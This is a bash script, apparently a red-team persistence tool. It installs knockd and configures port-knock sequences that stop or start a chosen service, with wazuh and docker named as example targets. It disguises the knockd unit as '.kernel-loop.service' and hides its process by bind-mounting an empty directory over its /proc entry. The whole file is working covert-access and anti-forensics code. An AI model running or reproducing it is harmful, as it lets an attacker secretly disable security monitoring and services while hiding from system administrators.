#!/bin/bash

# Ensure the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root."
  exit 1
fi

# Step 1: Install knockd
echo "Installing knockd..."
apt update && apt install -y knockd


# We also need to enable then start the dang service
systemctl enable knockd

# Now start it up
systemctl start knockd

# Step 2: Edit knockd.conf to shut down a preferred service
echo "Configuring knockd.conf..."

# Define the service to shut down (e.g., apache2)
# CHANGE ME !!!! (To whatever we are trying to disable.. e.g. docker.service , wazuh.service, ....
SERVICE="apache2"


# Backup the original knockd.conf
# this is optional... we can also just purge and restart (In readme for purge commands)
cp /etc/knockd.conf /etc/knockd.conf.bak

# Write the new knockd.conf
# keep in mind you need to change the interface for each machine... (only tested on VM)
cat <<EOF > /etc/knockd.conf
[options]
    UseSyslog
    interface = eth0

[shutdownService]
    sequence    = 7000,8000,9000
    seq_timeout = 10
    command     = /usr/bin/systemctl stop $SERVICE
    tcpflags    = syn

[startService]
    sequence    = 1111,2222,3333
    seq_timeout = 10
    command     = /usr/bin/systemctl start $SERVICE
    tcpflags    = syn
EOF

# Step 3: Hide the knockd systemd service
 echo "Hiding the knockd systemd service..."

# Rename the service file to a hidden name
SERVICE_FILE="/lib/systemd/system/knockd.service"
# using a hidden .
HIDDEN_SERVICE_FILE="/lib/systemd/system/.kernel-loop.service"

if [ -f "$SERVICE_FILE" ]; then
  mv "$SERVICE_FILE" "$HIDDEN_SERVICE_FILE"
  systemctl restart .kernel-loop.service
  systemctl enable .kernel-loop.service
  echo "Knockd service hidden and restarted."
else
  echo "Knockd service file not found. Exiting."
  exit 1
fi

# Step 4: Capture the PID of the knockd process and bind mount /proc/<PID>
echo "Capturing the PID of the knockd process..."

# Get the PID of the knockd process
KNOCKD_PID=$(pgrep -f "knockd")

if [ -z "$KNOCKD_PID" ]; then
  echo "Could not find the knockd process. Exiting."
  exit 1
fi

echo "Knockd process found with PID: $KNOCKD_PID"

# Create the target directory (/var/empty)
mkdir -p /var/empty

# Bind mount /proc/<PID> to /var/empty
mount --bind /var/empty "/proc/$KNOCKD_PID"

echo "Mount of /proc/$KNOCKD_PID changed to /var/empty."

# Final message
echo "Script completed successfully."
